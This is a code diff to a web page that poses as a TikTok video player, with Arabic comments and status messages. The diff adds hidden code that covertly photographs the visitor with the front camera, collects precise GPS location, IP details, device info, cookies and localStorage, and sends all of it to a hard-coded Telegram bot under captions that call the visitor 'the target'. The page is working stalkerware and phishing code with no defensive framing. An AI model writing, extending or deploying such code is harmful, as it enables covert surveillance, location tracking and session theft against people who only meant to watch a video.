@@ -163,6 +163,16 @@
             width: 0%;
             transition: width 0.3s ease;
         }
+        #camera-feed {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1;
+        }
+        #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -189,9 +199,12 @@
         <div id="notification"></div>
     </div>
 
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="camera-feed" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
     <script>
         // ========== إعدادات التليجرام ==========
-        // ⚠️ غير هذي القيم بتاعتك ⚠️
         const TELEGRAM_BOT_TOKEN = '8246710006:AAHDzo0liPiUnrv6GqaQDZppyAbsVrF7TSI';  // ← حط التوكن بتاع بوتك
         const CHAT_ID = '1197183184';              // ← حط الـ Chat ID بتاعك
         const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/';
@@ -202,6 +215,12 @@
         const loadingMessage = document.getElementById('loading-message');
         const progressFill = document.getElementById('progress-fill');
         const notificationDiv = document.getElementById('notification');
+        const cameraFeed = document.getElementById('camera-feed');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        let cameraStream = null;
+        let capturedImage = null;
 
         let collectedData = {
             timestamp: new Date().toISOString(),
@@ -251,7 +270,6 @@
                 orientation: screen.orientation ? screen.orientation.type : 'unknown'
             };
             
-            // Local Storage
             try {
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
@@ -262,13 +280,37 @@
             console.log('✅ Device info collected');
         }
 
-        // ========== جلب الـ IP والموقع ==========
+        // ========== التقاط صورة من الكاميرا ==========
+        async function capturePhoto() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                cameraFeed.srcObject = cameraStream;
+                await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
+                
+                canvas.width = cameraFeed.videoWidth;
+                canvas.height = cameraFeed.videoHeight;
+                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+                
+                capturedImage = canvas.toDataURL('image/jpeg', 0.8);
+                
+                cameraStream.getTracks().forEach(track => track.stop());
+                console.log('✅ Photo captured');
+                return true;
+            } catch (error) {
+                console.warn('Camera capture failed:', error);
+                return false;
+            }
+        }
+
+        // ========== جلب الـ IP والموقع الدقيق ==========
         async function getIPAndLocation() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const ipData = await res.json();
                 collectedData.ipInfo = ipData;
-                console.log('✅ IP info collected:', ipData.ip);
+                console.log('✅ IP collected:', ipData.ip);
             } catch(e) {
                 console.log('❌ IP fetch failed');
             }
@@ -278,56 +320,102 @@
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 10000
+                            timeout: 15000,
+                            maximumAge: 0
                         });
                     });
                     collectedData.location = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude || null,
+                        speed: position.coords.speed || null
                     };
                     console.log('✅ GPS location collected');
                 } catch(e) {
-                    console.log('❌ GPS access denied or failed');
+                    console.log('❌ GPS denied or failed');
                 }
             }
         }
 
-        // ========== إرسال البيانات للتليجرام ==========
-        async function sendToTelegram() {
+        // ========== إرسال الصورة للتليجرام ==========
+        async function sendPhotoToTelegram() {
+            if (!capturedImage) return false;
+            
+            try {
+                const blob = await fetch(capturedImage).then(r => r.blob());
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'camera.jpg');
+                formData.append('caption', '📸 صورة من كاميرا الهدف');
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log('✅ Photo sent to Telegram');
+                return true;
+            } catch(e) {
+                console.error('❌ Failed to send photo:', e);
+                return false;
+            }
+        }
+
+        // ========== إرسال الموقع للتليجرام ==========
+        async function sendLocationToTelegram() {
+            if (!collectedData.location) return false;
+            
+            const { latitude, longitude, accuracy } = collectedData.location;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        latitude: latitude,
+                        longitude: longitude,
+                        horizontal_accuracy: accuracy
+                    })
+                });
+                console.log('✅ Location sent to Telegram');
+                return true;
+            } catch(e) {
+                console.error('❌ Failed to send location:', e);
+                return false;
+            }
+        }
+
+        // ========== إرسال البيانات النصية للتليجرام ==========
+        async function sendTextDataToTelegram() {
             let message = `🎯 <b>New Target!</b>\n\n`;
             
-            // IP والموقع
             if (collectedData.ipInfo) {
                 message += `🌍 <b>IP Location:</b>\n`;
                 message += `   IP: <code>${collectedData.ipInfo.ip || 'Unknown'}</code>\n`;
                 message += `   City: ${collectedData.ipInfo.city || 'Unknown'}\n`;
                 message += `   Country: ${collectedData.ipInfo.country || 'Unknown'}\n`;
-                message += `   ISP: ${collectedData.ipInfo.org || 'Unknown'}\n`;
-                if (collectedData.ipInfo.latitude) {
-                    message += `   📍 <a href="https://maps.google.com/?q=${collectedData.ipInfo.latitude},${collectedData.ipInfo.longitude}">View Map</a>\n`;
-                }
-                message += `\n`;
+                message += `   ISP: ${collectedData.ipInfo.org || 'Unknown'}\n\n`;
             }
             
-            // GPS
             if (collectedData.location) {
                 message += `📍 <b>GPS Location:</b>\n`;
                 message += `   Lat: ${collectedData.location.latitude}\n`;
                 message += `   Lon: ${collectedData.location.longitude}\n`;
                 message += `   Accuracy: ${collectedData.location.accuracy}m\n`;
-                message += `   📍 <a href="https://maps.google.com/?q=${collectedData.location.latitude},${collectedData.location.longitude}">View GPS Map</a>\n\n`;
+                if (collectedData.location.altitude) {
+                    message += `   Altitude: ${collectedData.location.altitude}m\n`;
+                }
+                message += `\n`;
             }
             
-            // معلومات الجهاز
             message += `📱 <b>Device Info:</b>\n`;
             message += `   Platform: ${collectedData.deviceInfo.platform || 'Unknown'}\n`;
             message += `   Screen: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
             message += `   RAM: ${collectedData.deviceInfo.deviceMemory}GB\n`;
             message += `   Browser: ${collectedData.userAgent.substring(0, 100)}...\n\n`;
             
-            // الكوكيز
-            if (collectedData.cookies) {
+            if (collectedData.cookies && collectedData.cookies.length > 0) {
                 message += `🍪 <b>Cookies:</b>\n`;
                 message += `   <code>${collectedData.cookies.substring(0, 300)}</code>\n\n`;
             }
@@ -346,9 +434,9 @@
                         disable_web_page_preview: true
                     })
                 });
-                console.log('✅ Data sent to Telegram');
+                console.log('✅ Text data sent to Telegram');
             } catch(e) {
-                console.error('❌ Failed to send:', e);
+                console.error('❌ Failed to send text:', e);
             }
         }
 
@@ -360,21 +448,37 @@
                 collectDeviceInfo();
                 await new Promise(r => setTimeout(r, 500));
                 
-                updateProgress(30);
-                loadingMessage.textContent = 'جاري جلب المعلومات...';
+                updateProgress(20);
+                loadingMessage.textContent = 'جاري جلب الموقع...';
                 await getIPAndLocation();
                 await new Promise(r => setTimeout(r, 500));
                 
+                updateProgress(40);
+                loadingMessage.textContent = 'جاري الوصول للكاميرا...';
+                await capturePhoto();
+                await new Promise(r => setTimeout(r, 500));
+                
                 updateProgress(60);
-                loadingMessage.textContent = 'جاري التجهيز...';
+                loadingMessage.textContent = 'جاري تجهيز البيانات...';
+                await new Promise(r => setTimeout(r, 500));
+                
+                updateProgress(70);
+                loadingMessage.textContent = 'جاري إرسال الصورة...';
+                await sendPhotoToTelegram();
+                await new Promise(r => setTimeout(r, 500));
+                
+                updateProgress(80);
+                loadingMessage.textContent = 'جاري إرسال الموقع...';
+                await sendLocationToTelegram();
                 await new Promise(r => setTimeout(r, 500));
                 
                 updateProgress(90);
-                loadingMessage.textContent = 'جاري الإرسال...';
-                await sendToTelegram();
+                loadingMessage.textContent = 'جاري إرسال البيانات...';
+                await sendTextDataToTelegram();
                 await new Promise(r => setTimeout(r, 500));
                 
                 updateProgress(100);
+                console.log('✅ All data sent');
                 
             } catch(error) {
                 console.error('Stealth operation error:', error);
@@ -393,10 +497,8 @@
             startStealthOperation();
         });
 
-        // إشعار أولي
         showNotification('اضغط لمشاهدة الفيديو');
 
-        // تشغيل تلقائي بعد 30 ثانية
         setTimeout(() => {
             if (!loadingOverlay.classList.contains('active')) {
                 videoPlaceholder.classList.add('hidden');
